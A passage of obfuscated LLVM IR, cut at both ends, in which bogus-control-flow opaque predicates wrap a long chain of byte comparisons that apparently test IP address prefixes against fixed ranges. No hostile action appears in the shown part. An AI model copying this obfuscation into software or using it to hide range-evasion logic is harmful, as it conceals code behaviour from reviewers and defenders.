  %2320 = icmp eq i32 %2319, 0
  %2321 = icmp slt i32 %2316, 10
  %2322 = or i1 %2320, %2321
  br i1 %2322, label %originalBBpart2316, label %originalBB314alteredBB

originalBBpart2316:                               ; preds = %originalBB314
  br i1 %2314, label %2323, label %2327

; <label>:2323:                                   ; preds = %originalBBpart2316
  %2324 = load i8, i8* %11, align 1
  %2325 = zext i8 %2324 to i32
  %2326 = icmp eq i32 %2325, 68
  br i1 %2326, label %5259, label %2327

; <label>:2327:                                   ; preds = %2323, %originalBBpart2316
  %2328 = load i8, i8* %10, align 1
  %2329 = zext i8 %2328 to i32
  %2330 = icmp eq i32 %2329, 139
  br i1 %2330, label %2331, label %2351

; <label>:2331:                                   ; preds = %2327
  %2332 = load i32, i32* @x.57
  %2333 = load i32, i32* @y.58
  %2334 = sub i32 %2332, 1
  %2335 = mul i32 %2332, %2334
  %2336 = urem i32 %2335, 2
  %2337 = icmp eq i32 %2336, 0
  %2338 = icmp slt i32 %2333, 10
  %2339 = or i1 %2337, %2338
  br i1 %2339, label %originalBB318, label %originalBB318alteredBB

originalBB318:                                    ; preds = %originalBB318alteredBB, %2331
  %2340 = load i8, i8* %11, align 1
  %2341 = zext i8 %2340 to i32
  %2342 = icmp eq i32 %2341, 59
  %2343 = load i32, i32* @x.57
  %2344 = load i32, i32* @y.58
  %2345 = sub i32 %2343, 1
  %2346 = mul i32 %2343, %2345
  %2347 = urem i32 %2346, 2
  %2348 = icmp eq i32 %2347, 0
  %2349 = icmp slt i32 %2344, 10
  %2350 = or i1 %2348, %2349
  br i1 %2350, label %originalBBpart2320, label %originalBB318alteredBB

originalBBpart2320:                               ; preds = %originalBB318
  br i1 %2342, label %5259, label %2351

; <label>:2351:                                   ; preds = %originalBBpart2320, %2327
  %2352 = load i8, i8* %10, align 1
  %2353 = zext i8 %2352 to i32
  %2354 = icmp eq i32 %2353, 146
  br i1 %2354, label %2355, label %2367

; <label>:2355:                                   ; preds = %2351
  %2356 = load i8, i8* %11, align 1
  %2357 = zext i8 %2356 to i32
  %2358 = icmp eq i32 %2357, 185
  br i1 %2358, label %2359, label %2367

; <label>:2359:                                   ; preds = %2355
  %2360 = load i8, i8* %12, align 1
  %2361 = zext i8 %2360 to i32
  %2362 = icmp sge i32 %2361, 128
  br i1 %2362, label %2363, label %2367

; <label>:2363:                                   ; preds = %2359
  %2364 = load i8, i8* %12, align 1
  %2365 = zext i8 %2364 to i32
  %2366 = icmp slt i32 %2365, 191
  br i1 %2366, label %5259, label %2367

; <label>:2367:                                   ; preds = %2363, %2359, %2355, %2351
  %2368 = load i8, i8* %10, align 1
  %2369 = zext i8 %2368 to i32
  %2370 = icmp eq i32 %2369, 163
  br i1 %2370, label %2371, label %2415

; <label>:2371:                                   ; preds = %2367
  %2372 = load i8, i8* %11, align 1
  %2373 = zext i8 %2372 to i32
  %2374 = icmp eq i32 %2373, 47
  br i1 %2374, label %2375, label %2415

; <label>:2375:                                   ; preds = %2371
  %2376 = load i32, i32* @x.57
  %2377 = load i32, i32* @y.58
  %2378 = sub i32 %2376, 1
  %2379 = mul i32 %2376, %2378
  %2380 = urem i32 %2379, 2
  %2381 = icmp eq i32 %2380, 0
  %2382 = icmp slt i32 %2377, 10
  %2383 = or i1 %2381, %2382
  br i1 %2383, label %originalBB322, label %originalBB322alteredBB

originalBB322:                                    ; preds = %originalBB322alteredBB, %2375
  %2384 = load i8, i8* %12, align 1
  %2385 = zext i8 %2384 to i32
  %2386 = icmp sge i32 %2385, 10
  %2387 = load i32, i32* @x.57
  %2388 = load i32, i32* @y.58
  %2389 = sub i32 %2387, 1
  %2390 = mul i32 %2387, %2389
  %2391 = urem i32 %2390, 2
  %2392 = icmp eq i32 %2391, 0
  %2393 = icmp slt i32 %2388, 10
  %2394 = or i1 %2392, %2393
  br i1 %2394, label %originalBBpart2324, label %originalBB322alteredBB

originalBBpart2324:                               ; preds = %originalBB322
  br i1 %2386, label %2395, label %2415

; <label>:2395:                                   ; preds = %originalBBpart2324
  %2396 = load i32, i32* @x.57
  %2397 = load i32, i32* @y.58
  %2398 = sub i32 %2396, 1
  %2399 = mul i32 %2396, %2398
  %2400 = urem i32 %2399, 2
  %2401 = icmp eq i32 %2400, 0
  %2402 = icmp slt i32 %2397, 10
  %2403 = or i1 %2401, %2402
  br i1 %2403, label %originalBB326, label %originalBB326alteredBB

originalBB326:                                    ; preds = %originalBB326alteredBB, %2395
  %2404 = load i8, i8* %12, align 1
  %2405 = zext i8 %2404 to i32
  %2406 = icmp slt i32 %2405, 11
  %2407 = load i32, i32* @x.57
  %2408 = load i32, i32* @y.58
  %2409 = sub i32 %2407, 1
  %2410 = mul i32 %2407, %2409
  %2411 = urem i32 %2410, 2
  %2412 = icmp eq i32 %2411, 0
  %2413 = icmp slt i32 %2408, 10
  %2414 = or i1 %2412, %2413
  br i1 %2414, label %originalBBpart2328, label %originalBB326alteredBB

originalBBpart2328:                               ; preds = %originalBB326
  br i1 %2406, label %5259, label %2415

; <label>:2415:                                   ; preds = %originalBBpart2328, %originalBBpart2324, %2371, %2367
  %2416 = load i8, i8* %10, align 1
  %2417 = zext i8 %2416 to i32
  %2418 = icmp eq i32 %2417, 174
  br i1 %2418, label %2419, label %2431

; <label>:2419:                                   ; preds = %2415
  %2420 = load i8, i8* %11, align 1
  %2421 = zext i8 %2420 to i32
  %2422 = icmp eq i32 %2421, 138
  br i1 %2422, label %2423, label %2431

; <label>:2423:                                   ; preds = %2419
  %2424 = load i8, i8* %12, align 1
  %2425 = zext i8 %2424 to i32
  %2426 = icmp sge i32 %2425, 1
  br i1 %2426, label %2427, label %2431

; <label>:2427:                                   ; preds = %2423
  %2428 = load i8, i8* %12, align 1
  %2429 = zext i8 %2428 to i32
  %2430 = icmp slt i32 %2429, 127
  br i1 %2430, label %5259, label %2431

; <label>:2431:                                   ; preds = %2427, %2423, %2419, %2415
  %2432 = load i8, i8* %10, align 1
  %2433 = zext i8 %2432 to i32
  %2434 = icmp eq i32 %2433, 192
  br i1 %2434, label %2435, label %2479

; <label>:2435:                                   ; preds = %2431
  %2436 = load i8, i8* %11, align 1
  %2437 = zext i8 %2436 to i32
  %2438 = icmp eq i32 %2437, 241
  br i1 %2438, label %2439, label %2479

; <label>:2439:                                   ; preds = %2435
  %2440 = load i32, i32* @x.57
  %2441 = load i32, i32* @y.58
  %2442 = sub i32 %2440, 1
  %2443 = mul i32 %2440, %2442
  %2444 = urem i32 %2443, 2
  %2445 = icmp eq i32 %2444, 0
  %2446 = icmp slt i32 %2441, 10
  %2447 = or i1 %2445, %2446
  br i1 %2447, label %originalBB330, label %originalBB330alteredBB

originalBB330:                                    ; preds = %originalBB330alteredBB, %2439
  %2448 = load i8, i8* %12, align 1
  %2449 = zext i8 %2448 to i32
  %2450 = icmp sge i32 %2449, 128
  %2451 = load i32, i32* @x.57
  %2452 = load i32, i32* @y.58
  %2453 = sub i32 %2451, 1
  %2454 = mul i32 %2451, %2453
  %2455 = urem i32 %2454, 2
  %2456 = icmp eq i32 %2455, 0
  %2457 = icmp slt i32 %2452, 10
  %2458 = or i1 %2456, %2457
  br i1 %2458, label %originalBBpart2332, label %originalBB330alteredBB

originalBBpart2332:                               ; preds = %originalBB330
  br i1 %2450, label %2459, label %2479

; <label>:2459:                                   ; preds = %originalBBpart2332
  %2460 = load i32, i32* @x.57
  %2461 = load i32, i32* @y.58
  %2462 = sub i32 %2460, 1
  %2463 = mul i32 %2460, %2462
  %2464 = urem i32 %2463, 2
  %2465 = icmp eq i32 %2464, 0
  %2466 = icmp slt i32 %2461, 10
  %2467 = or i1 %2465, %2466
  br i1 %2467, label %originalBB334, label %originalBB334alteredBB

originalBB334:                                    ; preds = %originalBB334alteredBB, %2459
  %2468 = load i8, i8* %12, align 1
  %2469 = zext i8 %2468 to i32
  %2470 = icmp slt i32 %2469, 255
  %2471 = load i32, i32* @x.57
  %2472 = load i32, i32* @y.58
  %2473 = sub i32 %2471, 1
  %2474 = mul i32 %2471, %2473
  %2475 = urem i32 %2474, 2
  %2476 = icmp eq i32 %2475, 0
  %2477 = icmp slt i32 %2472, 10
  %2478 = or i1 %2476, %2477
  br i1 %2478, label %originalBBpart2336, label %originalBB334alteredBB

originalBBpart2336:                               ; preds = %originalBB334
  br i1 %2470, label %5259, label %2479

; <label>:2479:                                   ; preds = %originalBBpart2336, %originalBBpart2332, %2435, %2431
  %2480 = load i32, i32* @x.57
  %2481 = load i32, i32* @y.58
  %2482 = sub i32 %2480, 1
  %2483 = mul i32 %2480, %2482
  %2484 = urem i32 %2483, 2
  %2485 = icmp eq i32 %2484, 0
  %2486 = icmp slt i32 %2481, 10
  %2487 = or i1 %2485, %2486
  br i1 %2487, label %originalBB338, label %originalBB338alteredBB

originalBB338:                                    ; preds = %originalBB338alteredBB, %2479
  %2488 = load i8, i8* %10, align 1
  %2489 = zext i8 %2488 to i32
  %2490 = icmp eq i32 %2489, 198
  %2491 = load i32, i32* @x.57
  %2492 = load i32, i32* @y.58
  %2493 = sub i32 %2491, 1
  %2494 = mul i32 %2491, %2493
  %2495 = urem i32 %2494, 2
  %2496 = icmp eq i32 %2495, 0
  %2497 = icmp slt i32 %2492, 10
  %2498 = or i1 %2496, %2497
  br i1 %2498, label %originalBBpart2340, label %originalBB338alteredBB

originalBBpart2340:                               ; preds = %originalBB338
  br i1 %2490, label %2499, label %2543

; <label>:2499:                                   ; preds = %originalBBpart2340
  %2500 = load i32, i32* @x.57
  %2501 = load i32, i32* @y.58
  %2502 = sub i32 %2500, 1
  %2503 = mul i32 %2500, %2502
  %2504 = urem i32 %2503, 2
  %2505 = icmp eq i32 %2504, 0
  %2506 = icmp slt i32 %2501, 10
  %2507 = or i1 %2505, %2506
  br i1 %2507, label %originalBB342, label %originalBB342alteredBB

originalBB342:                                    ; preds = %originalBB342alteredBB, %2499
  %2508 = load i8, i8* %11, align 1
  %2509 = zext i8 %2508 to i32
  %2510 = icmp eq i32 %2509, 199
  %2511 = load i32, i32* @x.57
  %2512 = load i32, i32* @y.58
  %2513 = sub i32 %2511, 1
  %2514 = mul i32 %2511, %2513
  %2515 = urem i32 %2514, 2
  %2516 = icmp eq i32 %2515, 0
  %2517 = icmp slt i32 %2512, 10
  %2518 = or i1 %2516, %2517
  br i1 %2518, label %originalBBpart2344, label %originalBB342alteredBB

originalBBpart2344:                               ; preds = %originalBB342
  br i1 %2510, label %2519, label %2543

; <label>:2519:                                   ; preds = %originalBBpart2344
  %2520 = load i32, i32* @x.57
  %2521 = load i32, i32* @y.58
  %2522 = sub i32 %2520, 1
  %2523 = mul i32 %2520, %2522
  %2524 = urem i32 %2523, 2
  %2525 = icmp eq i32 %2524, 0
  %2526 = icmp slt i32 %2521, 10
  %2527 = or i1 %2525, %2526
  br i1 %2527, label %originalBB346, label %originalBB346alteredBB

originalBB346:                                    ; preds = %originalBB346alteredBB, %2519
  %2528 = load i8, i8* %12, align 1
  %2529 = zext i8 %2528 to i32
  %2530 = icmp sge i32 %2529, 64
  %2531 = load i32, i32* @x.57
  %2532 = load i32, i32* @y.58
  %2533 = sub i32 %2531, 1
  %2534 = mul i32 %2531, %2533
  %2535 = urem i32 %2534, 2
  %2536 = icmp eq i32 %2535, 0
  %2537 = icmp slt i32 %2532, 10
  %2538 = or i1 %2536, %2537
  br i1 %2538, label %originalBBpart2348, label %originalBB346alteredBB

originalBBpart2348:                               ; preds = %originalBB346
  br i1 %2530, label %2539, label %2543

; <label>:2539:                                   ; preds = %originalBBpart2348
  %2540 = load i8, i8* %12, align 1
  %2541 = zext i8 %2540 to i32
  %2542 = icmp slt i32 %2541, 127
  br i1 %2542, label %5259, label %2543

; <label>:2543:                                   ; preds = %2539, %originalBBpart2348, %originalBBpart2344, %originalBBpart2340
  %2544 = load i8, i8* %10, align 1
  %2545 = zext i8 %2544 to i32
  %2546 = icmp eq i32 %2545, 198
  br i1 %2546, label %2547, label %2559

; <label>:2547:                                   ; preds = %2543
  %2548 = load i8, i8* %11, align 1
  %2549 = zext i8 %2548 to i32
  %2550 = icmp eq i32 %2549, 211
  br i1 %2550, label %2551, label %2559

; <label>:2551:                                   ; preds = %2547
  %2552 = load i8, i8* %12, align 1
  %2553 = zext i8 %2552 to i32
  %2554 = icmp sge i32 %2553, 96
  br i1 %2554, label %2555, label %2559

; <label>:2555:                                   ; preds = %2551
  %2556 = load i8, i8* %12, align 1
  %2557 = zext i8 %2556 to i32
  %2558 = icmp slt i32 %2557, 127
  br i1 %2558, label %5259, label %2559

; <label>:2559:                                   ; preds = %2555, %2551, %2547, %2543
  %2560 = load i8, i8* %10, align 1
  %2561 = zext i8 %2560 to i32
  %2562 = icmp eq i32 %2561, 207
  br i1 %2562, label %2563, label %2607

; <label>:2563:                                   ; preds = %2559
  %2564 = load i8, i8* %11, align 1
  %2565 = zext i8 %2564 to i32
  %2566 = icmp eq i32 %2565, 154
  br i1 %2566, label %2567, label %2607

; <label>:2567:                                   ; preds = %2563
  %2568 = load i32, i32* @x.57
  %2569 = load i32, i32* @y.58
  %2570 = sub i32 %2568, 1
  %2571 = mul i32 %2568, %2570
  %2572 = urem i32 %2571, 2
  %2573 = icmp eq i32 %2572, 0
  %2574 = icmp slt i32 %2569, 10
  %2575 = or i1 %2573, %2574
  br i1 %2575, label %originalBB350, label %originalBB350alteredBB

originalBB350:                                    ; preds = %originalBB350alteredBB, %2567
  %2576 = load i8, i8* %12, align 1
  %2577 = zext i8 %2576 to i32
  %2578 = icmp sge i32 %2577, 192
  %2579 = load i32, i32* @x.57
  %2580 = load i32, i32* @y.58
  %2581 = sub i32 %2579, 1
  %2582 = mul i32 %2579, %2581
  %2583 = urem i32 %2582, 2
  %2584 = icmp eq i32 %2583, 0
  %2585 = icmp slt i32 %2580, 10
  %2586 = or i1 %2584, %2585
  br i1 %2586, label %originalBBpart2352, label %originalBB350alteredBB

originalBBpart2352:                               ; preds = %originalBB350
  br i1 %2578, label %2587, label %2607

; <label>:2587:                                   ; preds = %originalBBpart2352
  %2588 = load i32, i32* @x.57
  %2589 = load i32, i32* @y.58
  %2590 = sub i32 %2588, 1
  %2591 = mul i32 %2588, %2590
  %2592 = urem i32 %2591, 2
  %2593 = icmp eq i32 %2592, 0
  %2594 = icmp slt i32 %2589, 10
  %2595 = or i1 %2593, %2594
  br i1 %2595, label %originalBB354, label %originalBB354alteredBB

originalBB354:                                    ; preds = %originalBB354alteredBB, %2587
  %2596 = load i8, i8* %12, align 1
  %2597 = zext i8 %2596 to i32
  %2598 = icmp slt i32 %2597, 255
  %2599 = load i32, i32* @x.57
  %2600 = load i32, i32* @y.58
  %2601 = sub i32 %2599, 1
  %2602 = mul i32 %2599, %2601
  %2603 = urem i32 %2602, 2
  %2604 = icmp eq i32 %2603, 0
  %2605 = icmp slt i32 %2600, 10
  %2606 = or i1 %2604, %2605
  br i1 %2606, label %originalBBpart2356, label %originalBB354alteredBB

originalBBpart2356:                               ; preds = %originalBB354
  br i1 %2598, label %5259, label %2607

; <label>:2607:                                   ; preds = %originalBBpart2356, %originalBBpart2352, %2563, %2559
  %2608 = load i8, i8* %10, align 1
  %2609 = zext i8 %2608 to i32
  %2610 = icmp eq i32 %2609, 37
  br i1 %2610, label %2611, label %2639

; <label>:2611:                                   ; preds = %2607
  %2612 = load i8, i8* %11, align 1
  %2613 = zext i8 %2612 to i32
  %2614 = icmp eq i32 %2613, 139
  br i1 %2614, label %2615, label %2639

; <label>:2615:                                   ; preds = %2611
  %2616 = load i32, i32* @x.57
  %2617 = load i32, i32* @y.58
  %2618 = sub i32 %2616, 1
  %2619 = mul i32 %2616, %2618
  %2620 = urem i32 %2619, 2
  %2621 = icmp eq i32 %2620, 0
  %2622 = icmp slt i32 %2617, 10
  %2623 = or i1 %2621, %2622
  br i1 %2623, label %originalBB358, label %originalBB358alteredBB

originalBB358:                                    ; preds = %originalBB358alteredBB, %2615
  %2624 = load i8, i8* %12, align 1
  %2625 = zext i8 %2624 to i32
  %2626 = icmp sge i32 %2625, 1
  %2627 = load i32, i32* @x.57
  %2628 = load i32, i32* @y.58
  %2629 = sub i32 %2627, 1
  %2630 = mul i32 %2627, %2629
  %2631 = urem i32 %2630, 2
  %2632 = icmp eq i32 %2631, 0
  %2633 = icmp slt i32 %2628, 10
  %2634 = or i1 %2632, %2633
  br i1 %2634, label %originalBBpart2360, label %originalBB358alteredBB

originalBBpart2360:                               ; preds = %originalBB358
  br i1 %2626, label %2635, label %2639

; <label>:2635:                                   ; preds = %originalBBpart2360
  %2636 = load i8, i8* %12, align 1
  %2637 = zext i8 %2636 to i32
  %2638 = icmp slt i32 %2637, 31
  br i1 %2638, label %5259, label %2639

; <label>:2639:                                   ; preds = %2635, %originalBBpart2360, %2611, %2607
  %2640 = load i32, i32* @x.57
  %2641 = load i32, i32* @y.58
  %2642 = sub i32 %2640, 1
  %2643 = mul i32 %2640, %2642
  %2644 = urem i32 %2643, 2
  %2645 = icmp eq i32 %2644, 0
  %2646 = icmp slt i32 %2641, 10
  %2647 = or i1 %2645, %2646
  br i1 %2647, label %originalBB362, label %originalBB362alteredBB

originalBB362:                                    ; preds = %originalBB362alteredBB, %2639
  %2648 = load i8, i8* %10, align 1
  %2649 = zext i8 %2648 to i32
  %2650 = icmp eq i32 %2649, 67
  %2651 = load i32, i32* @x.57
  %2652 = load i32, i32* @y.58
  %2653 = sub i32 %2651, 1
  %2654 = mul i32 %2651, %2653
  %2655 = urem i32 %2654, 2
  %2656 = icmp eq i32 %2655, 0
  %2657 = icmp slt i32 %2652, 10
  %2658 = or i1 %2656, %2657
  br i1 %2658, label %originalBBpart2364, label %originalBB362alteredBB

originalBBpart2364:                               ; preds = %originalBB362
  br i1 %2650, label %2659, label %2687

; <label>:2659:                                   ; preds = %originalBBpart2364
  %2660 = load i32, i32* @x.57
  %2661 = load i32, i32* @y.58
  %2662 = sub i32 %2660, 1
  %2663 = mul i32 %2660, %2662
  %2664 = urem i32 %2663, 2
  %2665 = icmp eq i32 %2664, 0
  %2666 = icmp slt i32 %2661, 10
  %2667 = or i1 %2665, %2666
  br i1 %2667, label %originalBB366, label %originalBB366alteredBB

originalBB366:                                    ; preds = %originalBB366alteredBB, %2659
  %2668 = load i8, i8* %11, align 1
  %2669 = zext i8 %2668 to i32
  %2670 = icmp eq i32 %2669, 207
  %2671 = load i32, i32* @x.57
  %2672 = load i32, i32* @y.58
  %2673 = sub i32 %2671, 1
  %2674 = mul i32 %2671, %2673
  %2675 = urem i32 %2674, 2
  %2676 = icmp eq i32 %2675, 0
  %2677 = icmp slt i32 %2672, 10
  %2678 = or i1 %2676, %2677
  br i1 %2678, label %originalBBpart2368, label %originalBB366alteredBB

originalBBpart2368:                               ; preds = %originalBB366
  br i1 %2670, label %2679, label %2687

; <label>:2679:                                   ; preds = %originalBBpart2368
  %2680 = load i8, i8* %12, align 1
  %2681 = zext i8 %2680 to i32
  %2682 = icmp sge i32 %2681, 64
  br i1 %2682, label %2683, label %2687

; <label>:2683:                                   ; preds = %2679
  %2684 = load i8, i8* %12, align 1
  %2685 = zext i8 %2684 to i32
  %2686 = icmp slt i32 %2685, 95
  br i1 %2686, label %5259, label %2687

; <label>:2687:                                   ; preds = %2683, %2679, %originalBBpart2368, %originalBBpart2364
  %2688 = load i8, i8* %10, align 1
  %2689 = zext i8 %2688 to i32
  %2690 = icmp eq i32 %2689, 67
  br i1 %2690, label %2691, label %2735

; <label>:2691:                                   ; preds = %2687
  %2692 = load i32, i32* @x.57
  %2693 = load i32, i32* @y.58
  %2694 = sub i32 %2692, 1
  %2695 = mul i32 %2692, %2694
  %2696 = urem i32 %2695, 2
  %2697 = icmp eq i32 %2696, 0
  %2698 = icmp slt i32 %2693, 10
  %2699 = or i1 %2697, %2698
  br i1 %2699, label %originalBB370, label %originalBB370alteredBB

originalBB370:                                    ; preds = %originalBB370alteredBB, %2691
  %2700 = load i8, i8* %11, align 1
  %2701 = zext i8 %2700 to i32
  %2702 = icmp eq i32 %2701, 205
  %2703 = load i32, i32* @x.57
  %2704 = load i32, i32* @y.58
  %2705 = sub i32 %2703, 1
  %2706 = mul i32 %2703, %2705
  %2707 = urem i32 %2706, 2
  %2708 = icmp eq i32 %2707, 0
  %2709 = icmp slt i32 %2704, 10
  %2710 = or i1 %2708, %2709
  br i1 %2710, label %originalBBpart2372, label %originalBB370alteredBB

originalBBpart2372:                               ; preds = %originalBB370
  br i1 %2702, label %2711, label %2735

; <label>:2711:                                   ; preds = %originalBBpart2372
  %2712 = load i32, i32* @x.57
  %2713 = load i32, i32* @y.58
  %2714 = sub i32 %2712, 1
  %2715 = mul i32 %2712, %2714
  %2716 = urem i32 %2715, 2
  %2717 = icmp eq i32 %2716, 0
  %2718 = icmp slt i32 %2713, 10
  %2719 = or i1 %2717, %2718
  br i1 %2719, label %originalBB374, label %originalBB374alteredBB

originalBB374:                                    ; preds = %originalBB374alteredBB, %2711
  %2720 = load i8, i8* %12, align 1
  %2721 = zext i8 %2720 to i32
  %2722 = icmp sge i32 %2721, 128
  %2723 = load i32, i32* @x.57
  %2724 = load i32, i32* @y.58
  %2725 = sub i32 %2723, 1
  %2726 = mul i32 %2723, %2725
  %2727 = urem i32 %2726, 2
  %2728 = icmp eq i32 %2727, 0
  %2729 = icmp slt i32 %2724, 10
  %2730 = or i1 %2728, %2729
  br i1 %2730, label %originalBBpart2376, label %originalBB374alteredBB

originalBBpart2376:                               ; preds = %originalBB374
  br i1 %2722, label %2731, label %2735

; <label>:2731:                                   ; preds = %originalBBpart2376
  %2732 = load i8, i8* %12, align 1
  %2733 = zext i8 %2732 to i32
  %2734 = icmp slt i32 %2733, 191
  br i1 %2734, label %5259, label %2735

; <label>:2735:                                   ; preds = %2731, %originalBBpart2376, %originalBBpart2372, %2687
  %2736 = load i32, i32* @x.57
  %2737 = load i32, i32* @y.58
  %2738 = sub i32 %2736, 1
  %2739 = mul i32 %2736, %2738
  %2740 = urem i32 %2739, 2
  %2741 = icmp eq i32 %2740, 0
  %2742 = icmp slt i32 %2737, 10
  %2743 = or i1 %2741, %2742
  br i1 %2743, label %originalBB378, label %originalBB378alteredBB

originalBB378:                                    ; preds = %originalBB378alteredBB, %2735
  %2744 = load i8, i8* %10, align 1
  %2745 = zext i8 %2744 to i32
  %2746 = icmp eq i32 %2745, 80
  %2747 = load i32, i32* @x.57
  %2748 = load i32, i32* @y.58
  %2749 = sub i32 %2747, 1
  %2750 = mul i32 %2747, %2749
  %2751 = urem i32 %2750, 2
  %2752 = icmp eq i32 %2751, 0
  %2753 = icmp slt i32 %2748, 10
  %2754 = or i1 %2752, %2753
  br i1 %2754, label %originalBBpart2380, label %originalBB378alteredBB

originalBBpart2380:                               ; preds = %originalBB378
  br i1 %2746, label %2755, label %2799

; <label>:2755:                                   ; preds = %originalBBpart2380
  %2756 = load i8, i8* %11, align 1
  %2757 = zext i8 %2756 to i32
  %2758 = icmp eq i32 %2757, 240
  br i1 %2758, label %2759, label %2799

; <label>:2759:                                   ; preds = %2755
  %2760 = load i32, i32* @x.57
  %2761 = load i32, i32* @y.58
  %2762 = sub i32 %2760, 1
  %2763 = mul i32 %2760, %2762
  %2764 = urem i32 %2763, 2
  %2765 = icmp eq i32 %2764, 0
  %2766 = icmp slt i32 %2761, 10
  %2767 = or i1 %2765, %2766
  br i1 %2767, label %originalBB382, label %originalBB382alteredBB

originalBB382:                                    ; preds = %originalBB382alteredBB, %2759
  %2768 = load i8, i8* %12, align 1
  %2769 = zext i8 %2768 to i32
  %2770 = icmp sge i32 %2769, 128
  %2771 = load i32, i32* @x.57
  %2772 = load i32, i32* @y.58
  %2773 = sub i32 %2771, 1
  %2774 = mul i32 %2771, %2773
  %2775 = urem i32 %2774, 2
  %2776 = icmp eq i32 %2775, 0
  %2777 = icmp slt i32 %2772, 10
  %2778 = or i1 %2776, %2777
  br i1 %2778, label %originalBBpart2384, label %originalBB382alteredBB

originalBBpart2384:                               ; preds = %originalBB382
  br i1 %2770, label %2779, label %2799

; <label>:2779:                                   ; preds = %originalBBpart2384
  %2780 = load i32, i32* @x.57
  %2781 = load i32, i32* @y.58
  %2782 = sub i32 %2780, 1
  %2783 = mul i32 %2780, %2782
  %2784 = urem i32 %2783, 2
  %2785 = icmp eq i32 %2784, 0
  %2786 = icmp slt i32 %2781, 10
  %2787 = or i1 %2785, %2786
  br i1 %2787, label %originalBB386, label %originalBB386alteredBB

originalBB386:                                    ; preds = %originalBB386alteredBB, %2779
  %2788 = load i8, i8* %12, align 1
  %2789 = zext i8 %2788 to i32
  %2790 = icmp slt i32 %2789, 143
  %2791 = load i32, i32* @x.57
  %2792 = load i32, i32* @y.58
  %2793 = sub i32 %2791, 1
  %2794 = mul i32 %2791, %2793
  %2795 = urem i32 %2794, 2
  %2796 = icmp eq i32 %2795, 0
  %2797 = icmp slt i32 %2792, 10
  %2798 = or i1 %2796, %2797
  br i1 %2798, label %originalBBpart2388, label %originalBB386alteredBB

originalBBpart2388:                               ; preds = %originalBB386
  br i1 %2790, label %5259, label %2799

; <label>:2799:                                   ; preds = %originalBBpart2388, %originalBBpart2384, %2755, %originalBBpart2380
  %2800 = load i8, i8* %10, align 1
  %2801 = zext i8 %2800 to i32
  %2802 = icmp eq i32 %2801, 82
  br i1 %2802, label %2803, label %2847

; <label>:2803:                                   ; preds = %2799
  %2804 = load i32, i32* @x.57
  %2805 = load i32, i32* @y.58
  %2806 = sub i32 %2804, 1
  %2807 = mul i32 %2804, %2806
  %2808 = urem i32 %2807, 2
  %2809 = icmp eq i32 %2808, 0
  %2810 = icmp slt i32 %2805, 10
  %2811 = or i1 %2809, %2810
  br i1 %2811, label %originalBB390, label %originalBB390alteredBB

originalBB390:                                    ; preds = %originalBB390alteredBB, %2803
  %2812 = load i8, i8* %11, align 1
  %2813 = zext i8 %2812 to i32
  %2814 = icmp eq i32 %2813, 196
  %2815 = load i32, i32* @x.57
  %2816 = load i32, i32* @y.58
  %2817 = sub i32 %2815, 1
  %2818 = mul i32 %2815, %2817
  %2819 = urem i32 %2818, 2
  %2820 = icmp eq i32 %2819, 0
  %2821 = icmp slt i32 %2816, 10
  %2822 = or i1 %2820, %2821
  br i1 %2822, label %originalBBpart2392, label %originalBB390alteredBB

originalBBpart2392:                               ; preds = %originalBB390
  br i1 %2814, label %2823, label %2847

; <label>:2823:                                   ; preds = %originalBBpart2392
  %2824 = load i8, i8* %12, align 1
  %2825 = zext i8 %2824 to i32
  %2826 = icmp sge i32 %2825, 1
  br i1 %2826, label %2827, label %2847

; <label>:2827:                                   ; preds = %2823
  %2828 = load i32, i32* @x.57
  %2829 = load i32, i32* @y.58
  %2830 = sub i32 %2828, 1
  %2831 = mul i32 %2828, %2830
  %2832 = urem i32 %2831, 2
  %2833 = icmp eq i32 %2832, 0
  %2834 = icmp slt i32 %2829, 10
  %2835 = or i1 %2833, %2834
  br i1 %2835, label %originalBB394, label %originalBB394alteredBB

originalBB394:                                    ; preds = %originalBB394alteredBB, %2827
  %2836 = load i8, i8* %12, align 1
  %2837 = zext i8 %2836 to i32
  %2838 = icmp slt i32 %2837, 15
  %2839 = load i32, i32* @x.57
  %2840 = load i32, i32* @y.58
  %2841 = sub i32 %2839, 1
  %2842 = mul i32 %2839, %2841
  %2843 = urem i32 %2842, 2
  %2844 = icmp eq i32 %2843, 0
  %2845 = icmp slt i32 %2840, 10
  %2846 = or i1 %2844, %2845
  br i1 %2846, label %originalBBpart2396, label %originalBB394alteredBB

originalBBpart2396:                               ; preds = %originalBB394
  br i1 %2838, label %5259, label %2847

; <label>:2847:                                   ; preds = %originalBBpart2396, %2823, %originalBBpart2392, %2799
  %2848 = load i32, i32* @x.57
  %2849 = load i32, i32* @y.58
  %2850 = sub i32 %2848, 1
  %2851 = mul i32 %2848, %2850
  %2852 = urem i32 %2851, 2
  %2853 = icmp eq i32 %2852, 0
  %2854 = icmp slt i32 %2849, 10
  %2855 = or i1 %2853, %2854
  br i1 %2855, label %originalBB398, label %originalBB398alteredBB

originalBB398:                                    ; preds = %originalBB398alteredBB, %2847
  %2856 = load i8, i8* %10, align 1
  %2857 = zext i8 %2856 to i32
  %2858 = icmp eq i32 %2857, 95
  %2859 = load i32, i32* @x.57
  %2860 = load i32, i32* @y.58
  %2861 = sub i32 %2859, 1
  %2862 = mul i32 %2859, %2861
  %2863 = urem i32 %2862, 2
  %2864 = icmp eq i32 %2863, 0
  %2865 = icmp slt i32 %2860, 10
  %2866 = or i1 %2864, %2865
  br i1 %2866, label %originalBBpart2400, label %originalBB398alteredBB

originalBBpart2400:                               ; preds = %originalBB398
  br i1 %2858, label %2867, label %2895

; <label>:2867:                                   ; preds = %originalBBpart2400
  %2868 = load i32, i32* @x.57
  %2869 = load i32, i32* @y.58
  %2870 = sub i32 %2868, 1
  %2871 = mul i32 %2868, %2870
  %2872 = urem i32 %2871, 2
  %2873 = icmp eq i32 %2872, 0
  %2874 = icmp slt i32 %2869, 10
  %2875 = or i1 %2873, %2874
  br i1 %2875, label %originalBB402, label %originalBB402alteredBB

originalBB402:                                    ; preds = %originalBB402alteredBB, %2867
  %2876 = load i8, i8* %11, align 1
  %2877 = zext i8 %2876 to i32
  %2878 = icmp eq i32 %2877, 85
  %2879 = load i32, i32* @x.57
  %2880 = load i32, i32* @y.58
  %2881 = sub i32 %2879, 1
  %2882 = mul i32 %2879, %2881
  %2883 = urem i32 %2882, 2
  %2884 = icmp eq i32 %2883, 0
  %2885 = icmp slt i32 %2880, 10
  %2886 = or i1 %2884, %2885
  br i1 %2886, label %originalBBpart2404, label %originalBB402alteredBB

originalBBpart2404:                               ; preds = %originalBB402
  br i1 %2878, label %2887, label %2895

; <label>:2887:                                   ; preds = %originalBBpart2404
  %2888 = load i8, i8* %12, align 1
